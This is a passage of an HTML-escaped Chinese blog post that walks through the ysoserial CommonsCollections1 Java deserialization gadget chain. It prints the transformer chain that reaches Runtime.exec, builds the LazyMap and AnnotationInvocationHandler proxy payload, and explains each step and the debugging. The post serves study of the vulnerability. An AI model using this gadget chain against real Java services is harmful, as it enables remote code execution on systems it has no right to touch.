class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123; String.class &amp;#125;, execArgs),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// 修饰innerMap，将构造的transformerChain传入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 当LayMap#get被调用时，会执行传入的transformerChain&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map innerMap = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HashMap();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map lazyMap = LazyMap.decorate(innerMap, transformerChain);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 将lazyMap传入AnnotationInvocationHandler&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// java代理sun.reflect.annotation.AnnotationInvocationHandler&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 获得代理对象时，会再传入一个handler（简称handler2），得到代理对象mapProxy，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// 将该代理对象包裹进入新的handler，简称handler1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// 最后将构造好的命令执行transformers传入transformerChain&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 最后放是为了防止在构造payload时弹出计算器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		Reflections.setFieldValue(transformerChain, &lt;span class=&#34;string&#34;&gt;&amp;quot;iTransformers&amp;quot;&lt;/span&gt;, transformers); &lt;span class=&#34;comment&#34;&gt;// arm with actual transformer chain&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// 最后包装好的handler即为我们的payload&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; handler;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;知识点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点&#34;&gt;#&lt;/a&gt; 知识点&lt;/h3&gt;
&lt;p&gt;需要理解的知识点主要有两部分：transform 和 proxy&lt;/p&gt;
&lt;p&gt;想要深究的话可以去看详细解释，以下只记录此处用到的点&lt;/p&gt;
&lt;p&gt;我看代理的时候是参考的这篇文章：&lt;a href=&#34;https://xie.infoq.cn/article/9a9387805a496e1485dc8430f&#34;&gt;https://xie.infoq.cn/article/9a9387805a496e1485dc8430f&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;先来看看trasnform&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#先来看看trasnform&#34;&gt;#&lt;/a&gt; 先来看看 trasnform&lt;/h4&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer transformerChain = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ChainedTransformer(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[]&amp;#123; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// real chain for after setup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(Runtime.class),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;getMethod&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        String.class, Class[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;invoke&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Object.class, Object[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123; String.class &amp;#125;, execArgs),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;ConstantTransformer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;构造方法传入一个类&lt;/p&gt;
&lt;p&gt;通过该类的 transform 方法获取一个对象类型，如 transform 参数是 Runtime.class 时，调用 ConstantTransformer 类的 transform 方法，执行后返回 java.lang.Runtime 类&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;InvokerTransformer&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;构造方法 InvokerTransformer (String methodName, Class [] paramTypes, Object [] args)&lt;/p&gt;
&lt;p&gt;第一个参数为方法名，第二个参数为方法参数类型数组，第三个参数为方法参数数组&lt;/p&gt;
&lt;p&gt;该类的 transform 通过反射执行函数&lt;/p&gt;
&lt;p&gt;例如下面的代码，transform 传入 Runtime 对象，通过反射执行 exec 函数，传入命令为 calc&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;InvokerTransformer invokerTransformer = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[]&amp;#123;String.class&amp;#125;,&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; String[]&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;calc&amp;quot;&lt;/span&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;invokerTransformer.transform(Runtime.getRuntime());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;transformerChain&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;transformers 的链，构造方法传入一个 transform 数组&lt;/p&gt;
&lt;p&gt;串起来了很多 transformer&lt;/p&gt;
&lt;p&gt;为什么是串起来的呢，见下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;62.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;其中前面一个 transform 输出的结果会作为参数传入后一个 transform&lt;/p&gt;
&lt;p&gt;那么此处代码就可以很好的解释啦&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 通过反射获取Runtime，因为Class类实现了Serializable接口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//        Method f = Runtime.class.getMethod(&amp;quot;getRuntime&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//        Runtime r = (Runtime) f.invoke(null);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//        r.exec(&amp;quot;C:\\WINDOWS\\system32\\calc.exe&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer transformerChain = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ChainedTransformer(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[]&amp;#123; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// real chain for after setup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 返回java.lang.Runtime类&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(Runtime.class),  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//传入上面transform得到的Runtime类（Class对象），调用getMethod方法，传入调用getMethod方法方法参数为getRuntime；也就是获取该类的getRuntime方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;getMethod&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            String.class, Class[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;string&#34;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 传入上面transform得到的getRuntime方法（Method对象），调用invoke方法，传入invoke方法的参数为Object[]，其实就是按照参数列表传就好了，因为此处只需要调用invoke方法获得Runtime对象&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;invoke&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Object.class, Object[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 传入上面transform得到的Runtime对象，调用exec方法，传入该方法的参数为execArgs&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123; String.class &amp;#125;, execArgs),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;最后康康proxy&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#最后康康proxy&#34;&gt;#&lt;/a&gt; 最后康康 proxy&lt;/h4&gt;
&lt;p&gt;为什么会利用到对象代理呢？&lt;/p&gt;
&lt;p&gt;当然是因为代理的一些些特性辣&lt;/p&gt;
&lt;p&gt;每个代理类有一个公共构造一个参数，该接口的实现 &lt;code&gt;InvocationHandler&lt;/code&gt;  ，设置调用处理程序的代理实例&lt;/p&gt;
&lt;p&gt;康康构造方法，会传入一个 InvocationHandler 对象&lt;/p&gt;
&lt;p&gt;并且在调用该代理对象任意方法时，会调用 InvocationHandler#invoke ()&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;63.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是该方法是 protected 的，很明显我们需要实例化一个代理对象时需要找到另一个可以返回实例的方法&lt;/p&gt;
&lt;p&gt;那就是 newProxyInstance 方法啦&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;64.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;来测试试试&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ysoserial.payloads.util.Gadgets;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.lang.reflect.InvocationHandler;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.lang.reflect.Method;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.lang.reflect.Proxy;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.util.Map;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * My Test Class&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;MTest&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        TestInvocationHandler handler = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; TestInvocationHandler();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Map testProxy = (Map) Proxy.newProxyInstance(Gadgets.class.getClassLoader(), &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[]&amp;#123;Map.class&amp;#125;, handler);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        testProxy.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;key&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;value&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;TestInvocationHandler&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;InvocationHandler&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;meta&#34;&gt;@Override&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; Object &lt;span class=&#34;title&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Object proxy, Method method, Object[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Throwable &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        System.out.println(&lt;span class=&#34;string&#34;&gt;&amp;quot;method: &amp;quot;&lt;/span&gt; + method.toString());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;debug 代码，可以看见当调用 Map#put 时，会进入 TestInvocationHandler#invoke&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;65.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;没戳 proxy 利用到的点就这一个啦&lt;/p&gt;
&lt;h3 id=&#34;调试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调试&#34;&gt;#&lt;/a&gt; 调试&lt;/h3&gt;
&lt;p&gt;比较绕的地方调试一波&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;36.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入该函数，发现有两处函数计算&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;37.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;进入 &lt;code&gt;createMemoizedInvocationHandler(map)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中 &lt;code&gt;ANN_INV_HANDLER_CLASS = &amp;quot;sun.reflect.annotation.AnnotationInvocationHandler&amp;quot;&lt;/code&gt;&lt;/p&gt;
